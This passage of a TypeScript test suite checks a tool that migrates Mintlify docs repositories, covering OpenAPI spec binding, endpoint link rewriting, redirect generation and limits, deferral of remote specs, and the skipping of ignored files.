          'both.mdx': apiPage('openapi POST /one'),
        }, { api: { openapi: 'declared.yaml' }, navigation: { pages: ['both'] } })
        expect(openapiOf(bundle, 'both')).toBe('openapi POST /one')
        const warning = messages(bundle).find((message) => message.includes('"both"'))
        expect(warning).toContain('a/openapi.yml')
        expect(warning).toContain('b/openapi.json')
        expect(warning).not.toContain('no file exists')
      })

      it('binds every spec of one API dropdown that pages name by stem (two specs, one tab)', () => {
        const tasks = Array.from({ length: 3 }, (_, index) => `management/tasks/t${index}`)
        const bundle = build({
          'openapi.yml': spec('/api/v3/batches'),
          'v3-openapi.yaml': spec('/api/v1/tasks/{taskIdentifier}/trigger'),
          'management/batches/create.mdx': apiPage('openapi POST /api/v3/batches'),
          'management/batches/create-again.mdx': apiPage('openapi POST /api/v3/batches'),
          'management/tasks/by-path.mdx': apiPage('v3-openapi.yaml POST /api/v1/tasks/{taskIdentifier}/trigger'),
          ...Object.fromEntries(tasks.map((id) => [`${id}.mdx`, apiPage('v3-openapi POST /api/v1/tasks/{taskIdentifier}/trigger')])),
          'introduction.mdx': '---\ntitle: Intro\n---\n',
        }, {
          api: { openapi: ['openapi.yml', 'v3-openapi.yaml'] },
          navigation: { dropdowns: [
            { dropdown: 'Documentation', pages: ['introduction'] },
            { dropdown: 'API reference', groups: [{ group: 'Management', pages: ['management/batches/create', 'management/batches/create-again', 'management/tasks/by-path', ...tasks] }] },
          ] },
        })
        expect(boundSources(bundle).sort()).toEqual(['openapi/openapi.yml', 'openapi/v3-openapi.yaml'])
        const hidden = bundle.docsConfig.tabs.filter((tab) => tab.api?.source === 'openapi/v3-openapi.yaml')
        expect(hidden).toEqual([expect.objectContaining({ hidden: true })])
        const visible = bundle.docsConfig.tabs.filter((tab) => tab.api && !tab.hidden)
        expect(visible.map((tab) => tab.api?.source)).toEqual(['openapi/openapi.yml'])
        expect(bundle.assets.map((asset) => asset.path)).toEqual(expect.arrayContaining(['openapi/openapi.yml', 'openapi/v3-openapi.yaml']))
        const refs = bundle.pages.flatMap((page) => (page.openapi ? [page.openapi] : []))
        expect(refs).toHaveLength(tasks.length + 3)
        for (const ref of refs) expect(ref).toMatch(/^openapi\/(?:openapi\.yml|v3-openapi\.yaml) POST \//)
        expect(openapiOf(bundle, 'management/batches/create')).toBe('openapi/openapi.yml POST /api/v3/batches')
        expect(openapiOf(bundle, 'management/tasks/t1')).toBe('openapi/v3-openapi.yaml POST /api/v1/tasks/{taskIdentifier}/trigger')
        expect(openapiOf(bundle, 'management/tasks/by-path')).toBe('openapi/v3-openapi.yaml POST /api/v1/tasks/{taskIdentifier}/trigger')
        const all = messages(bundle)
        expect(all.filter((message) => /not migrated|could not be loaded/.test(message))).toEqual([])
        const perTab = all.filter((message) => message.includes('already uses another OpenAPI spec'))
        expect(perTab).toHaveLength(1)
        expect(perTab[0]).not.toMatch(/was not added/)
        expect(perTab[0]).toContain('v3-openapi.yaml')
      })
    })
  })

  it('resolves an object-form `openapi: { source, directory }` group reference and warns that the directory scoping is lost', () => {
    const root = fixture()
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      navigation: {
        tabs: [{
          tab: 'Documentation',
          groups: [{
            group: 'API',
            openapi: { source: 'qstash/openapi.yaml', directory: 'qstash/api-reference' },
          }],
        }],
      },
    }))
    mkdirSync(join(root, 'qstash'), { recursive: true })
    writeFileSync(join(root, 'qstash', 'openapi.yaml'), 'openapi: 3.1.0\ninfo: { title: QStash, version: "1.0" }\npaths: {}')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })

    const apiTab = bundle.docsConfig.tabs.find((tab) => tab.tab === 'Documentation')
    expect(apiTab?.api).toEqual({ source: 'openapi/openapi.yaml' })
    expect(bundle.assets.map((asset) => asset.path)).toContain('openapi/openapi.yaml')
    expect(bundle.warnings.some((warning) =>
      warning.message.includes('qstash/api-reference') && warning.message.includes('covers a whole tab'))).toBe(true)
  })

  it('warns instead of silently dropping a second OpenAPI spec that resolves to an already-bound tab', () => {
    const root = fixture()
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      navigation: {
        tabs: [{
          tab: 'Documentation',
          groups: [
            { group: 'A', openapi: 'a/openapi.yaml' },
            { group: 'B', openapi: 'b/openapi.yaml' },
          ],
        }],
      },
    }))
    mkdirSync(join(root, 'a'), { recursive: true })
    mkdirSync(join(root, 'b'), { recursive: true })
    writeFileSync(join(root, 'a', 'openapi.yaml'), 'openapi: 3.1.0\ninfo: { title: A, version: "1.0" }\npaths: {}')
    writeFileSync(join(root, 'b', 'openapi.yaml'), 'openapi: 3.1.0\ninfo: { title: B, version: "1.0" }\npaths: {}')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })

    const apiTab = bundle.docsConfig.tabs.find((tab) => tab.tab === 'Documentation')
    expect(apiTab?.api?.source).toBe('openapi/openapi.yaml')
    expect(bundle.warnings.some((warning) =>
      warning.message.includes('already uses another OpenAPI spec'))).toBe(true)
  })

  it('disambiguates two OpenAPI specs bound to different tabs that share a basename, instead of one asset silently overwriting the other', () => {
    const root = fixture()
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      navigation: {
        tabs: [
          { tab: 'QStash', openapi: 'qstash/openapi.yaml' },
          { tab: 'Workflow', openapi: 'workflow/openapi.yaml' },
        ],
      },
    }))
    mkdirSync(join(root, 'qstash'), { recursive: true })
    mkdirSync(join(root, 'workflow'), { recursive: true })
    writeFileSync(join(root, 'qstash', 'openapi.yaml'), 'openapi: 3.1.0\ninfo: { title: QStash, version: "1.0" }\npaths: {}')
    writeFileSync(join(root, 'workflow', 'openapi.yaml'), 'openapi: 3.1.0\ninfo: { title: Workflow, version: "1.0" }\npaths: {}')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })

    const qstashTab = bundle.docsConfig.tabs.find((tab) => tab.tab === 'QStash')
    const workflowTab = bundle.docsConfig.tabs.find((tab) => tab.tab === 'Workflow')
    expect(qstashTab?.api?.source).toBeDefined()
    expect(workflowTab?.api?.source).toBeDefined()
    // Distinct assets, each with the right tab's own content — neither
    // spec silently overwrote the other's bytes.
    expect(qstashTab?.api?.source).not.toBe(workflowTab?.api?.source)
    const qstashAsset = bundle.assets.find((asset) => asset.path === qstashTab?.api?.source)
    const workflowAsset = bundle.assets.find((asset) => asset.path === workflowTab?.api?.source)
    expect(qstashAsset?.content.toString()).toContain('title: QStash')
    expect(workflowAsset?.content.toString()).toContain('title: Workflow')
    expect(bundle.warnings.some((warning) => warning.message.includes('already uses another OpenAPI spec'))).toBe(false)
  })

  it('rewrites in-content links to Mintlify auto-generated operation pages to the matching Thally /api/ route', () => {
    const root = fixture()
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      navigation: {
        tabs: [{
          tab: 'Documentation',
          groups: [{
            group: 'API',
            openapi: { source: 'qstash/openapi.yaml', directory: 'qstash/api-reference' },
          }],
        }],
      },
    }))
    mkdirSync(join(root, 'qstash'), { recursive: true })
    writeFileSync(join(root, 'qstash', 'openapi.yaml'), [
      'openapi: 3.1.0',
      'info: { title: QStash, version: "1.0" }',
      'paths:',
      '  /v2/publish/{destination}:',
      '    post:',
      '      summary: Publish a Message',
      '      tags: [Messages]',
      '      responses: { "200": { description: ok } }',
    ].join('\n'))
    writeFileSync(join(root, 'guide.mdx'), [
      '---',
      'title: Guide',
      '---',
      '',
      'See [publish](/qstash/api-reference/messages/publish-a-message) for details.',
    ].join('\n'))

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })

    const guide = bundle.pages.find((page) => page.id === 'guide')
    // The first (only) API-bound tab keeps the stable 'default' spec id;
    // the operation's route is path+method based, never the summary.
    expect(guide?.body).toContain('[publish](/api/default/v2/publish/destination/post)')
    expect(guide?.body).not.toContain('/qstash/api-reference/messages/publish-a-message')
  })

  it('keeps generated endpoint navigation for a `directory` spec beside authored groups and redirects Mintlify endpoint URLs', () => {
    const root = fixture()
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      navigation: {
        tabs: [{
          tab: 'API Reference',
          groups: [{ group: 'API Guides', pages: ['guide'] }],
          openapi: { source: 'openapi/openapi.yaml', directory: 'api/api-reference' },
        }],
      },
    }))
    mkdirSync(join(root, 'openapi'), { recursive: true })
    writeFileSync(join(root, 'openapi', 'openapi.yaml'), [
      'openapi: 3.1.0',
      'info: { title: Svc, version: "1.0" }',
      'paths:',
      '  /interns/{id}/access:',
      '    get:',
      '      summary: Get an intern\'s daemon access',
      '      tags: [alpha.decisions]',
      '      responses: { "200": { description: ok } }',
      '  /generation:',
      '    get:',
      '      summary: Get request & usage metadata for a generation',
      '      tags: [Generations]',
      '      responses: { "200": { description: ok } }',
    ].join('\n'))
    writeFileSync(join(root, 'guide.mdx'), [
      '---',
      'title: Guide',
      '---',
      '',
      'See [access](/api/api-reference/alphadecisions/get-an-interns-daemon-access).',
    ].join('\n'))

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })

    const apiTab = bundle.docsConfig.tabs.find((tab) => tab.tab === 'API Reference')
    expect(apiTab?.groups).toEqual([{ group: 'API Guides', pages: ['guide'] }])
    expect(apiTab?.api).toEqual({ source: 'openapi/openapi.yaml' })
    expect(bundle.pages.find((page) => page.id === 'guide')?.body)
      .toContain('[access](/api/default/interns/id/access/get)')
    expect(bundle.docsConfig.redirects).toEqual(expect.arrayContaining([
      { source: '/api/api-reference/alphadecisions/get-an-interns-daemon-access', destination: '/api/default/interns/id/access/get' },
      { source: '/api/api-reference/generations/get-request-&-usage-metadata-for-a-generation', destination: '/api/default/generation/get' },
    ]))
  })

  it('sends a link to a local `directory` spec endpoint to that endpoint however it is written, and leaves authored pages and redirects alone', () => {
    const root = fixture()
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      navigation: {
        tabs: [{
          tab: 'API Reference',
          groups: [{ group: 'API Guides', pages: ['guide', 'reference/own'] }],
          openapi: { source: 'openapi/openapi.yaml', directory: 'reference' },
        }],
      },
      redirects: [{ source: '/reference/old/', destination: '/guide' }],
    }))
    mkdirSync(join(root, 'openapi'), { recursive: true })
    writeFileSync(join(root, 'openapi', 'openapi.yaml'), [
      'openapi: 3.1.0',
      'info: { title: Svc, version: "1.0" }',
      'paths:',
      '  /users:',
      '    get:',
      '      summary: List users',
      '      tags: [Users]',
      '      responses: { "200": { description: ok } }',
    ].join('\n'))
    mkdirSync(join(root, 'reference'), { recursive: true })
    writeFileSync(join(root, 'reference', 'own.mdx'), '---\ntitle: Own\n---\n\nBody.')
    writeFileSync(join(root, 'guide.mdx'), [
      '---',
      'title: Guide',
      '---',
      '',
      '[a](/reference/users/list-users)',
      '',
      '[b](/reference/users/list-users/)',
      '',
      '[c](/reference/users/list-users/#response)',
      '',
      '[d](/reference/users/list-users/?lang=go)',
      '',
      '[e](/reference/users/list-users?lang=go#response)',
      '',
      '[own](/reference/own/#top)',
      '',
      '[old](/reference/old/#top)',
    ].join('\n'))

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })

    const body = bundle.pages.find((page) => page.id === 'guide')?.body ?? ''
    for (const link of [
      '[a](/api/default/users/get)',
      '[b](/api/default/users/get)',
      '[c](/api/default/users/get#response)',
      '[d](/api/default/users/get?lang=go)',
      '[e](/api/default/users/get?lang=go#response)',
      '[own](/reference/own/#top)',
      '[old](/reference/old/#top)',
    ]) expect(body).toContain(link)
    expect(bundle.warnings.map((warning) => warning.message).join('\n')).not.toMatch(/matched no endpoint/)
  })

  it('reads a `directory` written with surrounding slashes as the folder it names', () => {
    const root = fixture()
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      navigation: { tabs: [{ tab: 'API Reference', groups: [{ group: 'API Guides', pages: ['guide'] }], openapi: { source: 'openapi/openapi.yaml', directory: '/reference/' } }] },
    }))
    mkdirSync(join(root, 'openapi'), { recursive: true })
    writeFileSync(join(root, 'openapi', 'openapi.yaml'), [
      'openapi: 3.1.0',
      'info: { title: Svc, version: "1.0" }',
      'paths:',
      '  /users:',
      '    get:',
      '      summary: List users',
      '      tags: [Users]',
      '      responses: { "200": { description: ok } }',
    ].join('\n'))
    writeFileSync(join(root, 'guide.mdx'), '---\ntitle: Guide\n---\n\n[a](/reference/users/list-users)')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })

    expect(bundle.pages.find((page) => page.id === 'guide')?.body).toContain('[a](/api/default/users/get)')
    expect(bundle.docsConfig.redirects).toContainEqual({ source: '/reference/users/list-users', destination: '/api/default/users/get' })
    expect((bundle.docsConfig.redirects ?? []).some((redirect) => redirect.source.includes('//'))).toBe(false)
  })

  it('reads the operations of a JSON spec as JSON, as the renderer does, even where YAML would reject it', () => {
    const root = fixture()
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      navigation: { tabs: [{ tab: 'API Reference', groups: [{ group: 'API Guides', pages: ['guide'] }], openapi: { source: 'openapi/openapi.json', directory: 'reference' } }] },
    }))
    mkdirSync(join(root, 'openapi'), { recursive: true })
    // The repeated "title" is invalid for a YAML reader and accepted by a JSON one.
    writeFileSync(join(root, 'openapi', 'openapi.json'), '{"openapi":"3.1.0","info":{"title":"Svc","title":"Svc again","version":"1.0"},"paths":{"/users":{"get":{"summary":"List users","tags":["Users"],"responses":{"200":{"description":"ok"}}}}}}')
    writeFileSync(join(root, 'guide.mdx'), '---\ntitle: Guide\n---\n\n[a](/reference/users/list-users)')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })

    expect(bundle.pages.find((page) => page.id === 'guide')?.body).toContain('[a](/api/default/users/get)')
    expect(bundle.docsConfig.redirects).toContainEqual({ source: '/reference/users/list-users', destination: '/api/default/users/get' })
  })

  it('saves a local JSON spec without its byte order mark, which the renderer cannot parse', () => {
    const root = fixture()
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      navigation: { tabs: [{ tab: 'API Reference', groups: [{ group: 'API Guides', pages: ['guide'] }], openapi: { source: 'openapi/openapi.json', directory: 'reference' } }] },
    }))
    mkdirSync(join(root, 'openapi'), { recursive: true })
    const spec = '{"openapi":"3.1.0","info":{"title":"Svc","version":"1.0"},"paths":{"/users":{"get":{"summary":"List users","tags":["Users"],"responses":{"200":{"description":"ok"}}}}}}'
    writeFileSync(join(root, 'openapi', 'openapi.json'), Buffer.concat([Buffer.from([0xef, 0xbb, 0xbf]), Buffer.from(spec)]))
    writeFileSync(join(root, 'guide.mdx'), '---\ntitle: Guide\n---\n\n[a](/reference/users/list-users)')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })

    const saved = Buffer.from(bundle.assets.find((asset) => asset.path === 'openapi/openapi.json')?.content ?? [])
    expect(saved.toString('utf8')).toBe(spec)
    expect(bundle.pages.find((page) => page.id === 'guide')?.body).toContain('[a](/api/default/users/get)')
  })

  it('falls back to operationId, then method and path, when an operation summary is empty', () => {
    const root = fixture()
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      navigation: { tabs: [{ tab: 'API', openapi: { source: 'e.yaml', directory: 'api' } }] },
    }))
    writeFileSync(join(root, 'e.yaml'), [
      'openapi: 3.1.0', 'info: { title: E, version: "1.0" }', 'paths:',
      '  /a:', '    get:', '      summary: ""', '      operationId: listThings', '      tags: [T]', '      responses: { "200": { description: ok } }',
      '  /b:', '    get:', '      summary: "   "', '      tags: [T]', '      responses: { "200": { description: ok } }',
    ].join('\n'))
    const sources = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' }).docsConfig.redirects?.map((redirect) => redirect.source) ?? []
    expect(sources).toContain('/api/t/listthings')
    expect(sources).toContain('/api/t/get-b')
  })

  it('keeps the first operation and warns when two operations in a tag share a Mintlify endpoint slug', () => {
    const root = fixture()
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      navigation: { tabs: [{ tab: 'API', openapi: { source: 'd.yaml', directory: 'api' } }] },
    }))
    writeFileSync(join(root, 'd.yaml'), [
      'openapi: 3.1.0', 'info: { title: D, version: "1.0" }', 'paths:',
      '  /a:', '    get:', '      summary: Get thing', '      tags: [T]', '      responses: { "200": { description: ok } }',
      '  /b:', '    get:', '      summary: Get thing', '      tags: [T]', '      responses: { "200": { description: ok } }',
    ].join('\n'))
    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    expect(bundle.docsConfig.redirects?.filter((redirect) => redirect.source === '/api/t/get-thing')).toEqual([
      { source: '/api/t/get-thing', destination: '/api/default/a/get' },
    ])
    expect(bundle.warnings.map((warning) => warning.message).join('\n')).toContain('shared by more than one operation')
    expect(bundle.warnings.map((warning) => warning.message).join('\n')).toContain('/api/t/get-thing')
  })

  it('redirects a bare Mintlify tag URL to the first operation of that tag and rewrites body links to it', () => {
    const root = fixture()
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      navigation: { tabs: [{ tab: 'API', openapi: { source: 't.yaml', directory: 'api' } }, { tab: 'Docs', pages: ['index'] }] },
    }))
    writeFileSync(join(root, 'index.mdx'), '---\ntitle: Home\n---\n\nSee [BYOK](/api/byok).')
    writeFileSync(join(root, 't.yaml'), [
      'openapi: 3.1.0', 'info: { title: T, version: "1.0" }', 'paths:',
      '  /byok:', '    get:', '      summary: List credentials', '      tags: [BYOK]', '      responses: { "200": { description: ok } }',
      '    post:', '      summary: Create a credential', '      tags: [BYOK]', '      responses: { "200": { description: ok } }',
    ].join('\n'))
    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    expect(bundle.docsConfig.redirects).toContainEqual({ source: '/api/byok', destination: '/api/default/byok/get' })
    expect(bundle.pages.map((page) => page.body).join('\n')).toContain('(/api/default/byok/get)')
  })

  it('leaves a Mintlify endpoint URL that a page already serves to that page, without a warning', () => {
    const root = fixture()
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      navigation: { tabs: [{ tab: 'API', openapi: { source: 'o.yaml', directory: 'api' } }, { tab: 'Docs', pages: ['api/t/get-one'] }] },
    }))
    mkdirSync(join(root, 'api', 't'), { recursive: true })
    writeFileSync(join(root, 'api', 't', 'get-one.mdx'), '---\ntitle: Own page\n---\n\nBody.')
    writeFileSync(join(root, 'o.yaml'), [
      'openapi: 3.1.0', 'info: { title: O, version: "1.0" }', 'paths:',
      '  /a:', '    get:', '      summary: Get one', '      tags: [T]', '      responses: { "200": { description: ok } }',
      '  /b:', '    get:', '      summary: Get two', '      tags: [T]', '      responses: { "200": { description: ok } }',
    ].join('\n'))
    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    const sources = bundle.docsConfig.redirects?.map((redirect) => redirect.source) ?? []
    expect(sources).toContain('/api/t/get-two')
    expect(sources).not.toContain('/api/t/get-one')
    expect(bundle.warnings.map((warning) => warning.message).join('\n')).not.toMatch(/Created \d+ of \d+ Mintlify endpoint redirects/)
  })

  it('caps generated Mintlify endpoint redirects and warns how many were not created', () => {
    const root = fixture()
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      navigation: { tabs: [{ tab: 'API', openapi: { source: 'big.yaml', directory: 'api' } }] },
    }))
    const paths = Array.from({ length: 2_050 }, (_, index) => `  /op${index}:\n    get:\n      summary: Op ${index}\n      tags: [T]\n      responses: { "200": { description: ok } }`)
    writeFileSync(join(root, 'big.yaml'), ['openapi: 3.1.0', 'info: { title: Big, version: "1.0" }', 'paths:', ...paths].join('\n'))
    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    expect(bundle.docsConfig.redirects?.filter((redirect) => redirect.source.startsWith('/api/t'))).toHaveLength(2_000)
    expect(bundle.warnings.map((warning) => warning.message).join('\n')).toContain('Created 2000 of 2051 Mintlify endpoint redirects; skipped 51 because a site is limited to 2000')
  })

  it('drops a manual OpenAPI operation listing ("GET /path") with one warning instead of one missing-page warning per operation', () => {
    const root = fixture()
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      navigation: {
        tabs: [{
          tab: 'API Reference',
          openapi: 'service.yml',
          pages: ['GET /users', 'POST /users', 'landing'],
        }],
      },
    }))
    writeFileSync(join(root, 'service.yml'), 'openapi: 3.1.0\ninfo: { title: Service, version: "1.0" }\npaths: {}')
    writeFileSync(join(root, 'landing.mdx'), '---\ntitle: Landing\n---\n\nLanding.')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })

    expect(bundle.warnings.filter((warning) => warning.code === 'missing-page')).toHaveLength(0)
    expect(bundle.warnings.filter((warning) => /hand-pick or reorder individual OpenAPI operations/.test(warning.message))).toHaveLength(1)
  })

  it('defers remote OpenAPI downloads and keeps other content', () => {
    const root = fixture()
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      navigation: {
        tabs: [
          { tab: 'Guides', pages: ['guide'] },
          { tab: 'REST API', openapi: 'https://api.example.com/openapi.json', pages: ['rest-landing'] },
          { tab: 'WS API', openapi: 'http://api.example.com/ws-spec.json', pages: ['ws-landing'] },
          { tab: 'Private API', openapi: 'https://[::ffff:7f00:1]/spec.json', pages: ['private-landing'] },
        ],
      },
    }))
    writeFileSync(join(root, 'guide.mdx'), '---\ntitle: Guide\n---\n\nGuide content.')
    writeFileSync(join(root, 'rest-landing.mdx'), '---\ntitle: REST\n---\n\nLanding.')
    writeFileSync(join(root, 'ws-landing.mdx'), '---\ntitle: WS\n---\n\nLanding.')
    writeFileSync(join(root, 'private-landing.mdx'), '---\ntitle: Private\n---\n\nLanding.')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })

    for (const tab of ['REST API', 'WS API', 'Private API']) {
      expect(bundle.docsConfig.tabs.find((entry) => entry.tab === tab)?.api).toBeUndefined()
    }
    expect(bundle.pages.map((page) => page.id)).toEqual(expect.arrayContaining(['guide', 'rest-landing', 'ws-landing', 'private-landing']))
    expect(bundle.assets.map((asset) => asset.path)).not.toContain('openapi/openapi.json')
    for (const url of ['https://api.example.com/openapi.json', 'http://api.example.com/ws-spec.json', 'https://[::ffff:7f00:1]/spec.json']) {
      expect(bundle.warnings).toContainEqual(expect.objectContaining({
        code: 'unsupported-config',
        message: expect.stringContaining(url),
      }))
    }
    expect(bundle.remoteApiSpecs).toEqual([{ url: 'https://api.example.com/openapi.json', tabLabel: 'REST API' }, { url: 'https://[::ffff:7f00:1]/spec.json', tabLabel: 'Private API' }])
    expect(bundle.warnings.filter((warning) => warning.message.includes('requires a network download'))).toHaveLength(2)
    expect(execFileCalls.calls).toEqual([])
  })

  it('mounts one remote spec under every directory the API tabs of several products give it', () => {
    const root = fixture()
    const source = 'https://specs.example.com/openapi.json'
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      navigation: {
        products: [
          {
            product: 'Compute',
            tabs: [
              { tab: 'Guides', groups: [{ group: 'Start', pages: ['guide'] }] },
              { tab: 'API reference', openapi: { source, directory: 'compute/api-reference' }, groups: [{ group: 'Projects', pages: ['POST /v2/projects.createProject'] }] },
            ],
          },
          {
            product: 'Platform',
            tabs: [
              { tab: 'Guides', groups: [{ group: 'Start', pages: ['guide'] }] },
              { tab: 'API reference', openapi: { source, directory: 'platform/api-reference' }, groups: [{ group: 'Compute', pages: [{ group: 'Projects', pages: ['POST /v2/projects.createProject'] }] }] },
            ],
          },
        ],
      },
    }))
    writeFileSync(join(root, 'guide.mdx'), '---\ntitle: Guide\n---\n\nGuide content.')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })

    expect(bundle.remoteApiSpecs).toEqual([{
      url: source,
      tabLabel: 'API reference',
      directories: [
        { directory: 'compute/api-reference', operations: ['POST /v2/projects.createProject'] },
        { directory: 'platform/api-reference', operations: ['POST /v2/projects.createProject'] },
      ],
    }])
  })

  it('redirects the endpoint URLs of one local spec that two API tabs mount under different directories, each to its own tab', () => {
    const root = fixture()
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      navigation: { tabs: [
        { tab: 'Alpha', openapi: { source: 'o.yaml', directory: 'alpha' } },
        { tab: 'Beta', openapi: { source: 'o.yaml', directory: 'beta' } },
        { tab: 'Docs', pages: ['guide'] },
      ] },
    }))
    writeFileSync(join(root, 'guide.mdx'), '---\ntitle: Guide\n---\n\nGuide content.')
    writeFileSync(join(root, 'o.yaml'), [
      'openapi: 3.0.0', 'info: { title: T, version: "1" }', 'paths:',
      '  /a: { post: { summary: Create A, tags: [things], responses: { "200": { description: ok } } } }',
    ].join('\n'))

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })

    const redirects = new Map((bundle.docsConfig.redirects ?? []).map((redirect) => [redirect.source, redirect.destination]))
    expect(redirects.get('/alpha/things/create-a')).toBe('/api/default/a/post')
    expect(redirects.get('/beta/things/create-a')).toBe('/api/beta/a/post')
    expect(bundle.warnings.map((warning) => warning.message).join('\n')).not.toContain('shared by more than one operation')
  })

  it('keeps a body link to an authored page under a local spec directory, and still rewrites a link to an endpoint', () => {
    const root = fixture()
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      navigation: { tabs: [{ tab: 'API', openapi: { source: 'o.yaml', directory: 'ref' } }, { tab: 'Docs', pages: ['index', 'ref/guide'] }] },
    }))
    mkdirSync(join(root, 'ref'))
    writeFileSync(join(root, 'index.mdx'), '---\ntitle: Home\n---\n\n[Guide](/ref/guide) and [Thing](/ref/things/create-a).')
    writeFileSync(join(root, 'ref', 'guide.mdx'), '---\ntitle: Guide\n---\n\nGuide content.')
    writeFileSync(join(root, 'o.yaml'), [
      'openapi: 3.0.0', 'info: { title: T, version: "1" }', 'paths:',
      '  /a: { post: { summary: Create A, tags: [things], responses: { "200": { description: ok } } } }',
    ].join('\n'))

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })

    expect(bundle.pages.map((page) => page.body).join('\n')).toContain('[Guide](/ref/guide) and [Thing](/api/default/a/post).')
    expect(bundle.warnings.map((warning) => warning.message).join('\n')).not.toContain('matched no endpoint')
  })

  it('leaves a body link to an authored redirect source under a local spec directory to that redirect, not the overview', () => {
    const root = fixture()
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      navigation: { tabs: [{ tab: 'API', openapi: { source: 'o.yaml', directory: 'ref' } }, { tab: 'Docs', pages: ['index'] }] },
      redirects: [{ source: '/ref/old-thing', destination: '/ref/things/create-a' }],
    }))
    writeFileSync(join(root, 'index.mdx'), '---\ntitle: Home\n---\n\n[Old](/ref/old-thing) and [Thing](/ref/things/create-a) and [Lost](/ref/lost).')
    writeFileSync(join(root, 'o.yaml'), [
      'openapi: 3.0.0', 'info: { title: T, version: "1" }', 'paths:',
      '  /a: { post: { summary: Create A, tags: [things], responses: { "200": { description: ok } } } }',
    ].join('\n'))

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })

    expect(bundle.pages.map((page) => page.body).join('\n')).toContain('[Old](/ref/old-thing) and [Thing](/api/default/a/post) and [Lost](/api).')
    expect(bundle.docsConfig.redirects).toContainEqual({ source: '/ref/old-thing', destination: '/ref/things/create-a' })
  })

  it('keeps every operation listed under a directory that two API tabs of one name share', () => {
    const source = 'https://specs.example.com/openapi.json'
    const migrate = (second: Record<string, unknown>) => {
      const root = fixture()
      writeFileSync(join(root, 'docs.json'), JSON.stringify({
        navigation: {
          products: [
            { product: 'One', tabs: [{ tab: 'API reference', openapi: { source, directory: 'api-reference' }, groups: [{ group: 'Keys', pages: ['POST /v2/keys.create', 'POST /v2/keys.get'] }] }] },
            { product: 'Two', tabs: [{ tab: 'API reference', openapi: { source, directory: 'api-reference' }, ...second }] },
          ],
        },
      }))
      return migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' }).remoteApiSpecs
    }

    expect(migrate({ groups: [{ group: 'Keys', pages: ['POST /v2/keys.get', 'POST /v2/keys.delete'] }] })).toEqual([{
      url: source,
      tabLabel: 'API reference',
      directories: [{ directory: 'api-reference', operations: ['POST /v2/keys.create', 'POST /v2/keys.get', 'POST /v2/keys.delete'] }],
    }])
    // A tab that lists no operation had every operation generated, so the union is every operation.
    expect(migrate({})?.[0].directories).toEqual([{ directory: 'api-reference' }])
  })

  it("warns by name instead of silently dropping docs.json's api.asyncapi", () => {
    const root = fixture()
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      navigation: { tabs: [{ tab: 'Guides', pages: ['guide'] }] },
      api: { asyncapi: 'api-reference/voice.asyncapi.yaml' },
    }))
    writeFileSync(join(root, 'guide.mdx'), '---\ntitle: Guide\n---\n\nGuide content.')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })

    expect(bundle.docsConfig.tabs.some((tab) => tab.api)).toBe(false)
    expect(bundle.warnings).toContainEqual(expect.objectContaining({
      code: 'unsupported-config',
      message: expect.stringContaining('AsyncAPI is not supported'),
    }))
    expect(bundle.warnings.find((warning) => warning.message.includes('AsyncAPI'))?.message).toContain('voice.asyncapi.yaml')
  })

  it('skips dotfile directories and .mintignore paths, and excludes pages that fail to compile as MDX', () => {
    const root = fixture()
    // Dotfile directory: never a docs page, even without a .mintignore entry.
    mkdirSync(join(root, 'en', '.tooling', 'skills'), { recursive: true })
    writeFileSync(join(root, 'en', '.tooling', 'skills', 'skill.mdx'), '# Not a page')
    // Non-dotfile directory excluded only via .mintignore, like Mintlify's own
    // agent-context/ convention.
    mkdirSync(join(root, 'agent-context'), { recursive: true })
    writeFileSync(join(root, 'agent-context', 'notes.mdx'), '# Internal notes')
    writeFileSync(join(root, '.mintignore'), 'agent-context/\n')
